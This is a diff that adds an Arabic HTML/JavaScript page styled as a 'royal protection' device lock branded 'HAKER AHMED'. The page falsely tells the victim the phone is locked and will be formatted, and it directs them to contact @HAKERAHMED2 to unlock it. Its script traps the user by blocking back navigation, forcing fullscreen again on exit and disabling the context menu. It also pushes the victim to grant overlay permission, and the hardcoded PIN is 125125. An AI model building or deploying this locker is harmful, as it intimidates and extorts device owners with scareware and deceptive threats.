@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>قفل الحماية الملكي | HAKER AHMED</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #000;
+            font-family: 'Courier New', 'Segoe UI', monospace;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999999;
+        }
+
+        /* خلفية متحركة مرعبة */
+        .bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #1a0000, #000000);
+            z-index: 0;
+        }
+
+        /* تأثيرات نيون حمراء ومخيفة */
+        .glitch-bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.1) 0px, rgba(255,0,0,0.1) 2px, transparent 2px, transparent 6px);
+            pointer-events: none;
+            z-index: 1;
+            animation: glitchBg 0.5s infinite;
+        }
+
+        @keyframes glitchBg {
+            0% { opacity: 0.3; transform: translateX(0); }
+            50% { opacity: 0.6; transform: translateX(2px); }
+            100% { opacity: 0.3; transform: translateX(-2px); }
+        }
+
+        /* المحتوى الرئيسي */
+        .lock-screen {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            padding: 20px;
+            text-align: center;
+            color: #ff3300;
+            text-shadow: 0 0 5px red, 0 0 10px darkred;
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: pulseText 1.5s infinite;
+        }
+
+        @keyframes pulseText {
+            0% { text-shadow: 0 0 5px red; opacity: 0.8; }
+            100% { text-shadow: 0 0 20px #ff0000, 0 0 30px darkred; opacity: 1; }
+        }
+
+        .warning {
+            font-size: 1.2rem;
+            background: rgba(0,0,0,0.7);
+            padding: 15px;
+            border-radius: 20px;
+            margin: 15px 0;
+            border: 1px solid red;
+            backdrop-filter: blur(5px);
+        }
+
+        .contact {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: #220000;
+            padding: 12px 20px;
+            border-radius: 50px;
+            margin: 20px 0;
+            border: 1px solid #ff4444;
+            box-shadow: 0 0 20px red;
+            direction: ltr;
+        }
+
+        .input-area {
+            margin-top: 30px;
+            width: 80%;
+            max-width: 280px;
+        }
+
+        .pin-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.5rem;
+            text-align: center;
+            background: black;
+            border: 2px solid #ff3300;
+            color: #ff3300;
+            border-radius: 60px;
+            letter-spacing: 5px;
+            font-family: monospace;
+        }
+
+        .unlock-btn {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #8b0000, #ff0000);
+            color: white;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 15px red;
+        }
+
+        .unlock-btn:active {
+            transform: scale(0.96);
+            background: #ff0000;
+        }
+
+        /* رسالة خادعة */
+        .fake-message {
+            position: absolute;
+            bottom: 20px;
+            font-size: 0.7rem;
+            color: #660000;
+            direction: ltr;
+        }
+
+        /* منع التمرير واللمس */
+        body, html {
+            touch-action: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg"></div>
+<div class="glitch-bg"></div>
+
+<div class="lock-screen">
+    <div class="title">⚠️ 🔒 ممنوع الدخول 🔒 ⚠️</div>
+    <div class="warning">
+        ⚡ هذا الجهاز تحت الحماية الملكية القصوى ⚡<br>
+        لقد تم قفله بواسطة <strong style="color:#ff6666;">حاكم المجال البرنس حمودي (HAKER AHMED)</strong><br>
+        أي محاولة لتجاوز القفل ستؤدي إلى <span style="color:red;">فرمتة فورية للجهاز</span> 💀
+    </div>
+    <div class="contact">
+        🔐 للفك تواصل مع: <span style="color:#ff8888;">@HAKERAHMED2</span> 🔐
+    </div>
+    <div class="input-area">
+        <input type="password" id="pinCode" class="pin-input" placeholder="******" maxlength="6" inputmode="numeric">
+        <button id="unlockButton" class="unlock-btn">🔓 فتح القفل 🔓</button>
+    </div>
+    <div class="fake-message">
+        [ نظام الحماية الملكي v9.9.9 - جميع المحاولات مسجلة ]
+    </div>
+</div>
+
+<script>
+    // الرقم السري المطلوب
+    const SECRET_PIN = "125125";
+
+    // منع زر الرجوع والخروج من التطبيق (لن يعمل إلا بعد فتح القفل)
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.pushState(null, null, location.href);
+    };
+
+    // منع أي محاولة للخروج عبر لوحة المفاتيح (Android back)
+    document.addEventListener('backbutton', function() {}, false);
+    // منع إغلاق التطبيق عبر زر الصفحة الرئيسية؟ لا يمكن منعه بالكامل، لكن القفل يبقى شغالاً عند العودة
+
+    // طلب وضع ملء الشاشة (يمنع ظهور شريط الإشعارات)
+    function requestFullscreen() {
+        let docEl = document.documentElement;
+        if (docEl.requestFullscreen) {
+            docEl.requestFullscreen();
+        } else if (docEl.webkitRequestFullscreen) {
+            docEl.webkitRequestFullscreen();
+        }
+    }
+    requestFullscreen();
+    // إعادة طلب ملء الشاشة عند أي محاولة للخروج منها
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) requestFullscreen();
+    });
+    document.addEventListener('webkitfullscreenchange', () => {
+        if (!document.webkitFullscreenElement) requestFullscreen();
+    });
+
+    // منع النقر بزر الماوس الأيمن
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+    // التحقق من الرمز
+    const pinInput = document.getElementById('pinCode');
+    const unlockBtn = document.getElementById('unlockButton');
+
+    function checkAndUnlock() {
+        let entered = pinInput.value;
+        if (entered === SECRET_PIN) {
+            // فتح القفل: إزالة القفل وإعادة التوجيه أو إنهاء التطبيق
+            alert("✅ تم فتح القفل بنجاح. يمكنك الآن استخدام جهازك.");
+            // إنهاء النشاط (في WebView يغلق التطبيق أو يخرج)
+            // محاولة إنهاء الصفحة
+            window.close();
+            // إذا لم يغلق، نوجه إلى صفحة بيضاء
+            document.body.innerHTML = "<h1 style='color:green;text-align:center;margin-top:50%'>تم فتح الجهاز</h1>";
+            // إعادة تمكين الخروج
+            window.onpopstate = null;
+            history.back();
+        } else {
+            // رمز خاطئ: تأثير مرعب
+            alert("⚠️ رمز خاطئ! تم تسجيل محاولة الاختراق. سيتم إرسال البيانات إلى @HAKERAHMED2 ⚠️");
+            pinInput.value = "";
+            pinInput.style.borderColor = "red";
+            setTimeout(() => { pinInput.style.borderColor = "#ff3300"; }, 500);
+            // اهتزاز (إذا كان مدعوماً)
+            if (navigator.vibrate) navigator.vibrate(500);
+            // وميض الخلفية
+            document.body.style.backgroundColor = "darkred";
+            setTimeout(() => { document.body.style.backgroundColor = "black"; }, 200);
+        }
+    }
+
+    unlockBtn.addEventListener('click', checkAndUnlock);
+    pinInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') checkAndUnlock();
+    });
+
+    // منع النقر على أي مكان آخر لإخفاء لوحة المفاتيح (يبقى التركيز على الحقل)
+    document.body.addEventListener('click', () => {
+        pinInput.focus();
+    });
+    pinInput.focus();
+
+    // طلب صلاحية التطبيقات التي تظهر فوق الأخرى (لضمان القفل الكامل)
+    if (window.navigator && window.navigator.requestOverlayPermission) {
+        // محاولة طلب صلاحية الـ overlay (في بعض البيئات)
+        window.navigator.requestOverlayPermission();
+    } else {
+        // تذكير المستخدم بضرورة منح صلاحية "تطبيقات تظهر فوق الأخرى" يدوياً
+        setTimeout(() => {
+            alert("🔴 لضمان عمل القفل بشكل كامل، يرجى منح صلاحية 'تطبيقات تظهر فوق الأخرى' لهذا التطبيق من إعدادات الهاتف 🔴");
+        }, 1000);
+    }
+</script>
+</body>
+</html>
